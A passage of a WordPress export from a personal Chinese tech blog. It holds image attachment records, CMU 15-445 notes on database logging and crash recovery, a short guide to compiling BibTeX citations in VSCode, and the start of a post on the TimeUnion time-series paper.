		<title><![CDATA[07 Tree Indexes]]></title>
		<link>http://www.ironmanzzm.top/?attachment_id=272</link>
		<pubDate>Wed, 23 Feb 2022 03:59:44 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">http://www.ironmanzzm.top/wp-content/uploads/2022/02/07-Tree-Indexes.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>272</wp:post_id>
		<wp:post_date><![CDATA[2022-02-23 11:59:44]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-02-23 03:59:44]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-02-23 11:59:44]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-02-23 03:59:44]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[07-tree-indexes]]></wp:post_name>
		<wp:status><![CDATA[inherit]]></wp:status>
		<wp:post_parent>271</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[attachment]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
						<wp:attachment_url><![CDATA[http://www.ironmanzzm.top/wp-content/uploads/2022/02/07-Tree-Indexes.jpg]]></wp:attachment_url>
											<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attached_file]]></wp:meta_key>
		<wp:meta_value><![CDATA[2022/02/07-Tree-Indexes.jpg]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attachment_metadata]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:5:{s:5:"width";i:1467;s:6:"height";i:841;s:4:"file";s:27:"2022/02/07-Tree-Indexes.jpg";s:5:"sizes";a:10:{s:6:"medium";a:4:{s:4:"file";s:27:"07-Tree-Indexes-300x172.jpg";s:5:"width";i:300;s:6:"height";i:172;s:9:"mime-type";s:10:"image/jpeg";}s:5:"large";a:4:{s:4:"file";s:28:"07-Tree-Indexes-1024x587.jpg";s:5:"width";i:1024;s:6:"height";i:587;s:9:"mime-type";s:10:"image/jpeg";}s:9:"thumbnail";a:4:{s:4:"file";s:27:"07-Tree-Indexes-150x150.jpg";s:5:"width";i:150;s:6:"height";i:150;s:9:"mime-type";s:10:"image/jpeg";}s:12:"medium_large";a:4:{s:4:"file";s:27:"07-Tree-Indexes-768x440.jpg";s:5:"width";i:768;s:6:"height";i:440;s:9:"mime-type";s:10:"image/jpeg";}s:16:"dashscroll-small";a:4:{s:4:"file";s:27:"07-Tree-Indexes-200x200.jpg";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:10:"image/jpeg";}s:17:"dashscroll-medium";a:4:{s:4:"file";s:27:"07-Tree-Indexes-520x293.jpg";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:10:"image/jpeg";}s:16:"dashscroll-large";a:4:{s:4:"file";s:27:"07-Tree-Indexes-670x377.jpg";s:5:"width";i:670;s:6:"height";i:377;s:9:"mime-type";s:10:"image/jpeg";}s:18:"dashscroll-large-h";a:4:{s:4:"file";s:27:"07-Tree-Indexes-670x384.jpg";s:5:"width";i:670;s:6:"height";i:384;s:9:"mime-type";s:10:"image/jpeg";}s:9:"alx-small";a:4:{s:4:"file";s:27:"07-Tree-Indexes-200x200.jpg";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:10:"image/jpeg";}s:10:"alx-medium";a:4:{s:4:"file";s:27:"07-Tree-Indexes-520x293.jpg";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:10:"image/jpeg";}}s:10:"image_meta";a:12:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";s:11:"orientation";s:1:"0";s:8:"keywords";a:0:{}}}]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[08 Multi-Threaded Index Concurrency]]></title>
		<link>http://www.ironmanzzm.top/?attachment_id=276</link>
		<pubDate>Fri, 25 Feb 2022 05:59:19 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">http://www.ironmanzzm.top/wp-content/uploads/2022/02/08-Multi-Threaded-Index-Concurrency.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>276</wp:post_id>
		<wp:post_date><![CDATA[2022-02-25 13:59:19]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-02-25 05:59:19]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-02-25 13:59:19]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-02-25 05:59:19]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[08-multi-threaded-index-concurrency]]></wp:post_name>
		<wp:status><![CDATA[inherit]]></wp:status>
		<wp:post_parent>275</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[attachment]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
						<wp:attachment_url><![CDATA[http://www.ironmanzzm.top/wp-content/uploads/2022/02/08-Multi-Threaded-Index-Concurrency.jpg]]></wp:attachment_url>
											<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attached_file]]></wp:meta_key>
		<wp:meta_value><![CDATA[2022/02/08-Multi-Threaded-Index-Concurrency.jpg]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attachment_metadata]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:5:{s:5:"width";i:694;s:6:"height";i:404;s:4:"file";s:47:"2022/02/08-Multi-Threaded-Index-Concurrency.jpg";s:5:"sizes";a:8:{s:6:"medium";a:4:{s:4:"file";s:47:"08-Multi-Threaded-Index-Concurrency-300x175.jpg";s:5:"width";i:300;s:6:"height";i:175;s:9:"mime-type";s:10:"image/jpeg";}s:9:"thumbnail";a:4:{s:4:"file";s:47:"08-Multi-Threaded-Index-Concurrency-150x150.jpg";s:5:"width";i:150;s:6:"height";i:150;s:9:"mime-type";s:10:"image/jpeg";}s:16:"dashscroll-small";a:4:{s:4:"file";s:47:"08-Multi-Threaded-Index-Concurrency-200x200.jpg";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:10:"image/jpeg";}s:17:"dashscroll-medium";a:4:{s:4:"file";s:47:"08-Multi-Threaded-Index-Concurrency-520x293.jpg";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:10:"image/jpeg";}s:16:"dashscroll-large";a:4:{s:4:"file";s:47:"08-Multi-Threaded-Index-Concurrency-670x377.jpg";s:5:"width";i:670;s:6:"height";i:377;s:9:"mime-type";s:10:"image/jpeg";}s:18:"dashscroll-large-h";a:4:{s:4:"file";s:47:"08-Multi-Threaded-Index-Concurrency-670x390.jpg";s:5:"width";i:670;s:6:"height";i:390;s:9:"mime-type";s:10:"image/jpeg";}s:9:"alx-small";a:4:{s:4:"file";s:47:"08-Multi-Threaded-Index-Concurrency-200x200.jpg";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:10:"image/jpeg";}s:10:"alx-medium";a:4:{s:4:"file";s:47:"08-Multi-Threaded-Index-Concurrency-520x293.jpg";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:10:"image/jpeg";}}s:10:"image_meta";a:12:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";s:11:"orientation";s:1:"0";s:8:"keywords";a:0:{}}}]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[18 Logging Schemes]]></title>
		<link>http://www.ironmanzzm.top/?p=333</link>
		<pubDate>Fri, 20 May 2022 12:50:17 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">https://www.ironmanzzm.top/?p=333</guid>
		<description></description>
		<content:encoded><![CDATA[<!-- wp:heading -->
<h2>Recovery</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>为了保证事务修改的数据能被正确地持久化，设计了恢复算法保证数据库在发生意外时的一致性、原子性和持久性。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>恢复算法具有两个部分：</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>正常执行时记录事务执行的操作，以保证可以从失败中恢复。</li><li>数据库运行崩溃后能从保存下来的信息中恢复到崩溃前状态，并保证ACD。</li></ul>
<!-- /wp:list -->

<!-- wp:heading -->
<h2>差错类型</h2>
<!-- /wp:heading -->

<!-- wp:heading {"level":3} -->
<h3>Transaction Failures</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>事务层面的差错有可能是事务逻辑错误，例如违法完整性约束；也有可能是DBMS内部状态出错需要杀掉事务，例如进入死锁。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>System Failures</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>系统级别的差错分为软件错误（OS或DBMS实现有BUG）和硬件错误（电源中断）。发生硬件错误时我们假设非易失性存储不会因为系统崩溃而受到影响，而是停止运行。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>Storage Media Failure</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>存储介质差错可能是磁盘扫描头出错破坏了部分数据，这一类差错可以通过校验和检测出来，但DBMS无法从这种差错中恢复。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>DBMS必须保证以下两点：</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>已提交的事务必须保证持久化</li><li>未提交的事务如果被丢弃，不能出现部分数据被持久化的情况</li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>如果未提交的事务被丢弃，需要Undo已执行过的操作；如果提交的事务在持久化前因为崩溃丢失，需要Redo所有执行过的操作。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>Buffer Pool管理策略</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><img src="https://img.ironmanzzm.top/blog-img/20220331113600.png" alt=""><br>两个事务对同一个数组的不同字段进行修改，一个事务成功提交，另一个事务需要回滚。针对如何对这个元组进行持久化衍生出了不同的策略。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>Steal Policy</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>根据DBMS是否允许将未提交的事务数据持久化到硬盘，分为Steal和No-Steal。Steal指Buffer Pool可以从未提交事务修改的页面窃取空间，No-Steal则不允许这种窃取。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>Force Policy</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>DBMS要求所有更新都必须在提交时持久化到硬盘，称为Froce；否则称为No-Force</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>通过两类策略组合衍生出不同的算法：</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>No-Steal + Force</h3>
<!-- /wp:heading -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220331114333.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>当T2提交时T1尚未提交，No-Steal禁止将未提交的数据持久化到磁盘，而Force要求提交时必须持久化。为了解决这个问题，为T2生成了一个可以写出的版本。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>采用No-Steal策略不需要进行Undo，因为未执行完就被丢弃的数据不会出现在硬盘中。而采用Force策略则无需进行Redo操作，因为所有修改都被持久化（假设写磁盘操作是原子的）。但这种组合在Write-Set过大时会出现问题。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Shadow Paging</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>一种简单的实现是Shadow Paging：<br>磁盘中保存了一个记录了所有页号的DB Root，数据库将Root读入内存作为Master表，再复制一个Shadow Page Table。当事务对数据进行修改时，在一个新创建的页面上修改，修改Shadow Page Table中的指针使其指向新的页号。一旦事务提交成功，就修改DB Root的指针指向Shadow Page Table，并将新的DB Root写回磁盘。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220331130255.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>这种实现有几个问题：</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>每次修改完页面都要将页面、Page Table和Root写回磁盘</li><li>数据在磁盘中非常分散</li><li>需要垃圾回收机制</li><li>每次只能执行一个写事务</li><li>对页面的存取是以随机读取的形式进行</li></ul>
<!-- /wp:list -->

<!-- wp:heading -->
<h2>Write-Ahed Log Protocal</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>DBMS记录事务对数据作的修改日志，日志保存足够的信息使DBMS可以在崩溃后做Undo和Redo. WAL协议必须在数据持久化到磁盘之前将log写回磁盘，日志写入完毕才可以视为提交成功。Log的写入时机可以是事务提交后马上写入，也可以是累积到一定数量时便写入。由于知道事务作了哪些修改，Buffer Pool Policy可以采取<strong>Steal + No-Force</strong>的组合。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>每条日志包含以下信息：</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>事务ID</li><li>对象ID</li><li>原值</li><li>修改后的值</li></ul>
<!-- /wp:list -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220331132754.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":3} -->
<h3>Logging Schemes</h3>
<!-- /wp:heading -->

<!-- wp:heading {"level":4} -->
<h4>Physical Logging</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>类似 git diff，记录对某个具体位置的具体操作。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Logical Logging</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>记录事务调用了什么操作（如UPDATE, DELETE, INSERT），不需要记录具体操作了哪些数据。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>记录逻辑记录需要的空间更小，但每次恢复都要重新从头执行一遍，而且无法得知磁盘中的哪部分数据是崩溃前已经被修改过的。目前业界使用更广泛的模式是将两者结合的<strong>Physiological Logging</strong>。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>Checkpoints</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>如果不做特殊处理，日志就会一直增长，数据库崩溃后恢复扫描时间越来越长，于是出现了Checkpoint机制。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>DBMS每隔一段时间就将当前所有被修改过的数据写回磁盘，在日志上标记一个Checkpoint。当需要恢复时，上一个Checkpoint前已经提交的事务就可以不用处理，只处理尚未提交的事务。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>建立Checkpoint时需要暂停所有正在执行的事务，因此需要精心选择建立时间间隔。</p>
<!-- /wp:paragraph -->]]></content:encoded>
		<excerpt:encoded><![CDATA[为了保证事务修改的数据能被正确地持久化，设计了恢复算法保证数据库在发生意外时的一致性、原子性和持久性。]]></excerpt:encoded>
		<wp:post_id>333</wp:post_id>
		<wp:post_date><![CDATA[2022-05-20 20:50:17]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-05-20 12:50:17]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-05-20 20:50:17]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-05-20 12:50:17]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[18-logging-schemes]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="cmu-15-445-645"><![CDATA[CMU15-445/645]]></category>
		<category domain="post_tag" nicename="%e6%95%b0%e6%8d%ae%e5%ba%93"><![CDATA[数据库]]></category>
		<category domain="category" nicename="conputer-technology"><![CDATA[计算机技术]]></category>
		<category domain="post_tag" nicename="%e8%ae%a1%e7%ae%97%e6%9c%ba%e7%a7%91%e5%ad%a6"><![CDATA[计算机科学]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_thumbnail_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[334]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_layout]]></wp:meta_key>
		<wp:meta_value><![CDATA[inherit]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-disabled]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-insert]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-heading-levels]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:0:{}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-alttext]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-exclude]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[19 Database Recovery]]></title>
		<link>http://www.ironmanzzm.top/?p=336</link>
		<pubDate>Fri, 20 May 2022 12:51:26 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">https://www.ironmanzzm.top/?p=336</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[占坑]]></excerpt:encoded>
		<wp:post_id>336</wp:post_id>
		<wp:post_date><![CDATA[2022-05-20 20:51:26]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-05-20 12:51:26]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-05-20 20:51:43]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-05-20 12:51:43]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[21-database-recovery]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="cmu-15-445-645"><![CDATA[CMU15-445/645]]></category>
		<category domain="post_tag" nicename="%e6%95%b0%e6%8d%ae%e5%ba%93"><![CDATA[数据库]]></category>
		<category domain="category" nicename="conputer-technology"><![CDATA[计算机技术]]></category>
		<category domain="post_tag" nicename="%e8%ae%a1%e7%ae%97%e6%9c%ba%e7%a7%91%e5%ad%a6"><![CDATA[计算机科学]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_thumbnail_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[337]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_layout]]></wp:meta_key>
		<wp:meta_value><![CDATA[inherit]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-disabled]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-insert]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-heading-levels]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:0:{}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-alttext]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-exclude]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[VSCode中引用Bibtex参考文献]]></title>
		<link>http://www.ironmanzzm.top/?p=341</link>
		<pubDate>Sat, 28 May 2022 11:23:18 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">https://www.ironmanzzm.top/?p=341</guid>
		<description></description>
		<content:encoded><![CDATA[<!-- wp:heading -->
<h2>前言</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Bibtex以特殊格式记录文献的基本信息，在模板中引用参考文献时，就可以根据指定的格式自动生成参考文献引用。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>最近在做论文写作指导的期末作业，研究了一下在latex中添加Bibtex引用。在latex中插入引用的详细步骤参考：<a href="https://zhuanlan.zhihu.com/p/114733612?from_voters_page=true">仙人球仙女：Latex参考文献管理：Bibtex教程</a>。本文主要记录在VSCode下使用时遇到的一些坑，默认已经安装<code>tex live</code>环境和<code>latex workshop</code>插件。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>编译问题</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>将参考文献引用插入到正文后，在编译<code>.tex</code>文件之前需要先用<code>bibtex</code>对<code>.bib</code>文件进行编译，<code>bibtex</code>会生成一个<code>.bbl</code>文件。而workshop默认的编译链并不会调用bibtex，需要修改配置文件。</p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol><li>点击<code>文件-&gt;首选项-&gt;设置</code>，在搜索栏中搜索<code>latex.recipes</code>，选择<code>在settings.json中编辑</code>。</li></ol>
<!-- /wp:list -->

<!-- wp:image {"linkDestination":"media"} -->
<figure class="wp-block-image"><a href="https://img.ironmanzzm.top/blog-img/20220528190908.png"><img src="https://img.ironmanzzm.top/blog-img/20220528190908.png" alt=""/></a></figure>
<!-- /wp:image -->

<!-- wp:list {"ordered":true,"start":2} -->
<ol start="2"><li>将下图框中的几行调整到最上面。</li></ol>
<!-- /wp:list -->

<!-- wp:image {"linkDestination":"media"} -->
<figure class="wp-block-image"><a href="https://img.ironmanzzm.top/blog-img/20220528191133.png"><img src="https://img.ironmanzzm.top/blog-img/20220528191133.png" alt=""/></a></figure>
<!-- /wp:image -->

<!-- wp:list {"ordered":true,"start":3} -->
<ol start="3"><li>保存设置并退出，点击右上角编译<code>.tex</code>文件，应该就能生成<code>.pdf</code>文件。</li></ol>
<!-- /wp:list -->

<!-- wp:image {"linkDestination":"media"} -->
<figure class="wp-block-image"><a href="https://img.ironmanzzm.top/blog-img/20220528191358.png"><img src="https://img.ironmanzzm.top/blog-img/20220528191358.png" alt=""/></a></figure>
<!-- /wp:image -->]]></content:encoded>
		<excerpt:encoded><![CDATA[Bibtex是一种文献信息格式，latex支持插入Bibtex格式的参考文献。本文记录如何在vscode中修改编译链设置，对包含Bibtex引用的.tex文件进行编译。]]></excerpt:encoded>
		<wp:post_id>341</wp:post_id>
		<wp:post_date><![CDATA[2022-05-28 19:23:18]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-05-28 11:23:18]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-05-28 19:37:28]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-05-28 11:37:28]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[vscode%e4%b8%ad%e5%bc%95%e7%94%a8bibtex%e5%8f%82%e8%80%83%e6%96%87%e7%8c%ae]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="latex"><![CDATA[latex]]></category>
		<category domain="post_tag" nicename="%e7%8e%af%e5%a2%83%e9%85%8d%e7%bd%ae"><![CDATA[环境配置]]></category>
		<category domain="category" nicename="conputer-technology"><![CDATA[计算机技术]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_thumbnail_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[342]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_layout]]></wp:meta_key>
		<wp:meta_value><![CDATA[inherit]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-disabled]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-insert]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-heading-levels]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:0:{}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-alttext]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-exclude]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[TimeUnion: An Efficient Architecture with Unified Data Model for Timeseries Management Systems on Hybrid Cloud Storage]]></title>
		<link>http://www.ironmanzzm.top/?p=379</link>
		<pubDate>Sat, 27 Aug 2022 14:51:00 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">https://www.ironmanzzm.top/?p=379</guid>
		<description></description>
		<content:encoded><![CDATA[<!-- wp:paragraph -->
<p>TimeUnion是香港中文大学的Zhiqi Wang和Zili Shao两位老师提出的时序数据管理框架，论文发表于数据库领域的顶会SIGMOD 2022<a rel="noreferrer noopener" href="https://media.ironmanzzm.top/pdf/TimeUnion-%20An%20Efficient%20Architecture%20with%20Unified%20Data%20Model%20for%20Timeseries%20Management%20Systems%20on%20Hybrid%20Cloud%20Storage.pdf" target="_blank">(PDF</a>)，代码开源在<a rel="noreferrer noopener" href="https://github.com/naivewong/timeunion" data-type="URL" data-id="https://github.com/naivewong/timeunion" target="_blank">Github</a>。前段时间针对该文章作了一次分享，顺便写写总结。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>比较有意思的是针对混合云存储设计的LSM-Tree采用了三层结构，在慢速存储只有一层以减少compact次数。其他内容先留个坑，写完Dynamo再回头补完。</p>
<!-- /wp:paragraph -->

<!-- wp:html -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
<iframe src="https://media.ironmanzzm.top/TimeUnion%20%28Published%29/index.html" width="600" height="400" scrolling="no">
</iframe>
</div></figure>
<!-- /wp:html -->

<!-- wp:paragraph -->
<p></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p></p>
<!-- /wp:paragraph -->]]></content:encoded>
		<excerpt:encoded><![CDATA[TimeUnion是一个为混合云存储服务量身定制的高效时间序列管理系统。提出统一的数据模型来表示独立的时间序列和时间序列组，能够处理时间序列的不同用例。引入对时间序列的内存高效数据结构。提出了时间分区LSM树，它具有定制的架构、压缩机制、乱序数据处理和对时间序列数据的动态级别大小调整。]]></excerpt:encoded>
		<wp:post_id>379</wp:post_id>
		<wp:post_date><![CDATA[2022-08-27 22:51:00]]></wp:post_date>
